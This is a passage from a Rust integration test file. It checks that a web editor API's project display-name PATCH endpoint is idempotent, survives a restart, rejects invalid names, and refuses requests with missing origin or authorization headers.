                    .replace('\\', "/");
                output.insert(path, std::fs::read(entry.path()).unwrap());
            }
        }
    }

    let mut output = BTreeMap::new();
    visit(root, root, &mut output);
    output
}

#[tokio::test]
async fn project_display_name_patch_is_cas_idempotent_and_restart_durable() {
    let harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let original = created["project"].clone();
    let route = format!("/api/v1/projects/{project_id}");
    let request = json!({
        "schemaVersion":"1",
        "expectedDisplayName":"Untitled landing page",
        "displayName":"Campaign LP"
    });

    let updated = harness.patch(&route, request.clone()).await;
    assert_eq!(updated.status(), StatusCode::OK);
    let updated = response_json(updated).await;
    assert_eq!(updated["project"]["displayName"], "Campaign LP");
    for field in [
        "id",
        "revisionId",
        "acceptedManifestSha256",
        "status",
        "files",
        "activeReview",
        "history",
    ] {
        assert_eq!(updated["project"][field], original[field], "field {field}");
    }

    let retry = harness.patch(&route, request).await;
    assert_eq!(retry.status(), StatusCode::OK);
    assert_eq!(
        response_json(retry).await["project"]["displayName"],
        "Campaign LP"
    );
    let stale = harness
        .patch(
            &route,
            json!({
                "schemaVersion":"1",
                "expectedDisplayName":"Untitled landing page",
                "displayName":"Stale overwrite"
            }),
        )
        .await;
    assert_eq!(stale.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(stale).await["error"]["code"],
        "project_display_name_changed"
    );

    let harness = harness.restart().await;
    let reopened = response_json(harness.get(&route).await).await;
    assert_eq!(reopened["project"]["displayName"], "Campaign LP");
    for field in ["id", "revisionId", "acceptedManifestSha256", "files"] {
        assert_eq!(reopened["project"][field], original[field], "field {field}");
    }
}

#[tokio::test]
async fn project_display_name_boundaries_and_mutation_authority_fail_closed() {
    let harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let route = format!("/api/v1/projects/{project_id}");
    let valid_boundary = "🚀".repeat(256);
    let accepted = harness
        .patch(
            &route,
            json!({
                "schemaVersion":"1",
                "expectedDisplayName":"Untitled landing page",
                "displayName":valid_boundary
            }),
        )
        .await;
    assert_eq!(accepted.status(), StatusCode::OK);

    for invalid in [
        " ".to_owned(),
        "line\nbreak".to_owned(),
        "/home/private/project".to_owned(),
        "C:\\private\\project".to_owned(),
        "e\u{301}".to_owned(),
        "x".repeat(257),
        "🚀".repeat(257),
    ] {
        let response = harness
            .patch(
                &route,
                json!({
                    "schemaVersion":"1",
                    "expectedDisplayName":valid_boundary,
                    "displayName":invalid
                }),
            )
            .await;
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
        assert_eq!(
            response_json(response).await["error"]["code"],
            "invalid_request"
        );
    }
    let extra = harness
        .patch(
            &route,
            json!({
                "schemaVersion":"1",
                "expectedDisplayName":valid_boundary,
                "displayName":"Exact keys only",
                "extra":true
            }),
        )
        .await;
    assert_eq!(extra.status(), StatusCode::BAD_REQUEST);

    let payload = json!({
        "schemaVersion":"1",
        "expectedDisplayName":valid_boundary,
        "displayName":"Authority boundary"
    });
    let token_header = format!("Bearer {}", harness.token);
    let standard = [
        ("host", EDITOR_HOST),
        ("origin", EDITOR_ORIGIN),
        ("sec-fetch-site", "same-origin"),
        ("content-type", "application/json"),
        ("authorization", token_header.as_str()),
    ];
    for (omitted, expected_status) in [
        ("host", StatusCode::FORBIDDEN),
        ("origin", StatusCode::FORBIDDEN),
        ("sec-fetch-site", StatusCode::FORBIDDEN),
        ("content-type", StatusCode::UNSUPPORTED_MEDIA_TYPE),
        ("authorization", StatusCode::UNAUTHORIZED),
    ] {
        let headers = standard
            .iter()
            .copied()
            .filter(|(name, _)| *name != omitted)
            .collect::<Vec<_>>();
        assert_eq!(
            raw_patch_for(&harness.state, &route, &payload, &headers)
                .await
                .status(),
            expected_status,
            "omitted {omitted}"
        );
    }
}
